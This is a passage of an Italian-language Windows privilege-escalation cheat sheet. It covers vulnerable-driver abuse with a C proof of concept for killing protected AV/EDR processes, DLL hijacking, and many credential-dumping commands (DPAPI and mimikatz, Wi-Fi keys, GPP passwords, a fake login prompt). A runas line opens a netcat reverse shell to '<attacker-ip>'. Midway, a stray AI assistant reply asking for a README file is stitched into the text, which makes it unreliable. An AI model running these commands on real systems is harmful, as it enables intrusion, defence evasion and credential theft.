Cerca possibili driver **di terze parti strani/vulnerabili**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Se un driver espone una primitiva di lettura/scrittura arbitraria del kernel (comune in handler IOCTL mal progettati), puoi escalare rubando un token SYSTEM direttamente dalla memoria kernel. Vedi la tecnica passo‑per‑passo qui:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Per bug di race condition in cui la chiamata vulnerabile apre un percorso dell'Object Manager controllato dall'attaccante, rallentare deliberatamente la lookup (usando componenti a lunghezza massima o catene di directory profonde) può estendere la finestra da microsecondi a decine di microsecondi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Le moderne vulnerabilità degli hive consentono di creare layout deterministici, abusare di discendenti HKLM/HKU scrivibili e convertire la corruzione dei metadata in overflow del paged-pool del kernel senza un driver custom. Scopri l'intera catena qui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Alcuni driver firmati di terze parti creano il loro device object con un SDDL restrittivo tramite IoCreateDeviceSecure ma dimenticano di impostare FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Senza questo flag, la secure DACL non viene applicata quando il device viene aperto tramite un percorso contenente un componente aggiuntivo, permettendo a qualsiasi utente non privilegiato di ottenere un handle usando un percorso di namespace come:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Una volta che un utente può aprire il device, gli IOCTL privilegiati esposti dal driver possono essere abusati per LPE e manomissione. Esempi di capacità osservate nel mondo reale:
- Restituire handle con accesso completo a processi arbitrari (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Lettura/scrittura raw del disco senza restrizioni (manomissione offline, trucchi per persistenza all'avvio).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), permettendo kill di AV/EDR dalla user land tramite kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.

Detection ideas for defenders
- Monitora le aperture in user-mode di nomi di device sospetti (e.g., \\ .\\amsdk*) e sequenze IOCTL specifiche indicative di abuso.
- Applica la vulnerable driver blocklist di Microsoft (HVCI/WDAC/Smart App Control) e mantieni le tue liste allow/deny.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **elevate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per ulteriori informazioni su come sfruttare questo controllo:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Rete

### Condivisioni
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Controlla la presenza di altri computer noti hardcoded nel file hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete e DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Controlla la presenza di **restricted services** dall'esterno
```bash
netstat -ano #Opened ports?
```
### Tabella di routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabella ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del Firewall

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(elenca regole, crea regole, disattiva, disattiva...)**

Altri[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il binario `bash.exe` si trova anche in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni root user puoi ascoltare su qualsiasi porta (la prima volta che usi `nc.exe` per ascoltare su una porta chiederà tramite GUI se `nc` deve essere consentito dal firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Per avviare facilmente bash come root, puoi provare `--default-user root`

Puoi esplorare il filesystem di `WSL` nella cartella `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenziali di Windows

### Credenziali Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestore delle credenziali / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault memorizza le credenziali utente per server, siti web e altri programmi con cui **Windows** può **eseguire automaticamente l'accesso degli utenti**. A prima vista, potrebbe sembrare che gli utenti possano salvare le credenziali di Facebook, Twitter, Gmail, ecc. per effettuare il login automatico tramite i browser. Ma non è così.

Windows Vault memorizza credenziali che Windows può usare per eseguire automaticamente l'accesso degli utenti, il che significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (server o sito web) **può fare uso di questo Credential Manager** e Windows Vault e usare le credenziali fornite invece che gli utenti debbano inserire username e password ogni volta.

Se le applicazioni non interagiscono con Credential Manager, non credo sia possibile per esse usare le credenziali per una data risorsa. Quindi, se la tua applicazione vuole usare il vault, dovrebbe in qualche modo **comunicare con il Credential Manager e richiedere le credenziali per quella risorsa** dal vault di storage predefinito.

Usa il `cmdkey` per elencare le credenziali memorizzate sulla macchina.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Quindi puoi usare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. L'esempio seguente invoca un remote binary tramite una SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usare `runas` con un set di credenziali fornito.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Nota che mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), o dal [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la crittografia simmetrica dei dati, utilizzato principalmente nel sistema operativo Windows per la crittografia simmetrica delle chiavi private asimmetriche. Questa crittografia sfrutta un segreto dell'utente o del sistema per contribuire significativamente all'entropia.

**DPAPI consente la crittografia delle chiavi tramite una chiave simmetrica derivata dai segreti di login dell'utente**. In scenari di crittografia di sistema, utilizza i segreti di autenticazione del dominio del sistema.

Le chiavi RSA utente crittografate, usando DPAPI, sono memorizzate nella directory `%APPDATA%\Microsoft\Protect\{SID}`, dove `{SID}` rappresenta il [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) dell'utente. **La chiave DPAPI, co-locata con la master key che protegge le chiavi private dell'utente nello stesso file**, consiste tipicamente di 64 byte di dati casuali. (È importante notare che l'accesso a questa directory è ristretto, impedendo di elencarne il contenuto tramite il comando `dir` in CMD, anche se può essere elencata tramite PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Puoi usare **mimikatz module** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decifrarlo.

I **file di credenziali protetti dalla master password** si trovano solitamente in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Puoi usare **mimikatz module** `dpapi::cred` con il `/masterkey` appropriato per decrypt.\
Puoi **extract many DPAPI** **masterkeys** dalla **memory** con il `sekurlsa::dpapi` module (se sei root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** sono spesso usate per **scripting** e task di automazione come modo comodo per memorizzare credenziali criptate. Le credenziali sono protette usando **DPAPI**, il che tipicamente significa che possono essere decryptate solo dallo stesso utente sullo stesso computer in cui sono state create.

Per **decrypt** una PS credentials dal file che la contiene puoi fare:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connessioni RDP salvate

Le puoi trovare in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandi eseguiti di recente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestore credenziali Desktop remoto**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Usa il **Mimikatz** `dpapi::rdg` module con il `/masterkey` appropriato per **decrypt any .rdg files**\
Puoi **extract many DPAPI masterkeys** dalla memoria con il modulo Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Spesso le persone usano l'app StickyNotes sui workstation Windows per **save passwords** e altre informazioni, senza rendersi conto che si tratta di un file di database. Questo file si trova in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` ed è sempre utile cercarlo ed esaminarlo.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** si trova nella directory `%systemroot%\system32\inetsrv\`.\\
Se questo file esiste, è possibile che alcune **credentials** siano state configurate e possano essere **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifica se `C:\Windows\CCM\SCClient.exe` esiste .\
Gli installer vengono **eseguiti con privilegi SYSTEM**, molti sono vulnerabili a **DLL Sideloading (Informazioni da** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## File e Registro (Credenziali)

### Putty Credenziali
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chiavi host SSH di Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys nel registro

SSH private keys possono essere memorizzate all'interno della chiave del registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti controllare se c'è qualcosa di interessante lì:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi una voce in quel percorso, sarà probabilmente una chiave SSH salvata. È memorizzata cifrata ma può essere facilmente decifrata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Ulteriori informazioni su questa tecnica qui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se il servizio `ssh-agent` non è in esecuzione e vuoi che si avvii automaticamente all'avvio esegui:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Sembra che questa tecnica non sia più valida. Ho provato a creare alcune ssh keys, aggiungerle con `ssh-add` e effettuare il login via ssh su una macchina. Il registro HKCU\Software\OpenSSH\Agent\Keys non esiste e procmon non ha identificato l'uso di `dpapi.dll` durante l'asymmetric key authentication.

### File non presidiati
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Puoi anche cercare questi file usando **metasploit**: _post/windows/gather/enum_unattend_

Esempio di contenuto:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backup di SAM e SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenziali Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Cerca un file chiamato **SiteList.xml**

### Password GPP memorizzata nella cache

Una funzionalità era precedentemente disponibile che permetteva il deployment di account amministratore locali personalizzati su un gruppo di macchine tramite Group Policy Preferences (GPP). Tuttavia, questo metodo presentava gravi problemi di sicurezza. In primo luogo, i Group Policy Objects (GPOs), memorizzati come file XML in SYSVOL, potevano essere accessibili da qualsiasi utente di dominio. In secondo luogo, le password all'interno di questi GPP, criptate con AES256 utilizzando una chiave predefinita documentata pubblicamente, potevano essere decifrate da qualsiasi utente autenticato. Questo rappresentava un rischio serio, poiché poteva permettere agli utenti di ottenere privilegi elevati.

Per mitigare questo rischio, è stata sviluppata una funzione che scansiona i file GPP memorizzati localmente alla ricerca di un campo "cpassword" non vuoto. Al rilevamento di un tale file, la funzione decifra la password e restituisce un oggetto PowerShell personalizzato. Questo oggetto include dettagli sul GPP e sulla posizione del file, facilitando l'identificazione e la mitigazione di questa vulnerabilità di sicurezza.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (prima di Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Per decifrare la cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec per ottenere le password:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Esempio di web.config con credenziali:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Registri
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Chiedere le credentials

Puoi sempre **chiedere all'utente di inserire le sue credentials o anche le credentials di un altro utente** se pensi che le possa conoscere (nota che **chiedere** direttamente al client le **credentials** è davvero **rischioso**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Possibili nomi di file contenenti credentials**

File noti che, tempo fa, contenevano **passwords** in **clear-text** o **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Non hai fornito il contenuto del file src/windows-hardening/windows-local-privilege-escalation/README.md. Vuoi che cerchi/analizzi/traduca quel file specifico? Per favore incolla il contenuto del README.md o conferma che devo leggere il file nel tuo repository (fornisci accesso o path completo).
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenziali nel RecycleBin

Dovresti anche controllare il Cestino per cercare eventuali credenziali al suo interno

Per **recuperare password** salvate da diversi programmi puoi usare: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### All'interno del registro

**Altre possibili chiavi del registro contenenti credenziali**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Cronologia dei browser

Dovresti cercare i db dove sono memorizzate le password di **Chrome o Firefox**.\
Controlla anche la cronologia, i segnalibri e i preferiti dei browser, perché potrebbero essere memorizzate lì alcune **password**.

Strumenti per estrarre password dai browser:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** è una tecnologia integrata nel sistema operativo Windows che permette l'**intercomunicazione** tra componenti software scritti in linguaggi diversi. Ogni componente COM è **identificato tramite un class ID (CLSID)** e ogni componente espone funzionalità tramite una o più interfacce, identificate tramite interface IDs (IIDs).

Le classi e le interfacce COM sono definite nel registro sotto **HKEY\CLASSES\ROOT\CLSID** e **HKEY\CLASSES\ROOT\Interface** rispettivamente. Questo registro è creato unendo **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Fondamentalmente, se riesci a **sovrascrivere una qualsiasi delle DLL** che verranno eseguite, potresti **escalare i privilegi** se quella DLL viene eseguita da un utente diverso.

Per sapere come attackers usano COM Hijacking come meccanismo di persistenza, controlla:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Ricerca generica di password in file e registro**

**Cerca nei contenuti dei file**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Cerca un file con un determinato nome**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Cerca nel registro i nomi delle chiavi e le password**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Strumenti che cercano password

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin: l'ho creato per **eseguire automaticamente ogni metasploit POST module che cerca credentials** all'interno della vittima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) cerca automaticamente tutti i file che contengono password menzionate in questa pagina.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) è un altro ottimo strumento per estrarre password da un sistema.

Lo strumento [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) cerca **sessions**, **usernames** e **passwords** di diversi tool che salvano questi dati in chiaro (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Immagina che **un processo in esecuzione come SYSTEM apra un nuovo processo** (`OpenProcess()`) con **accesso completo**. Lo stesso processo **crei inoltre un nuovo processo** (`CreateProcess()`) **con privilegi bassi ma che eredita tutte le open handle del processo principale**.\
Quindi, se hai **accesso completo al processo a basso privilegio**, puoi prendere la **open handle verso il processo privilegiato creato** con `OpenProcess()` e **iniettare un shellcode**.\
[Leggi questo esempio per maggiori informazioni su **come individuare e sfruttare questa vulnerabilità**.](leaked-handle-exploitation.md)\
[Leggi questo **altro post per una spiegazione più completa su come testare e abusare di altre open handlers di processi e thread ereditate con diversi livelli di permessi (non solo accesso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

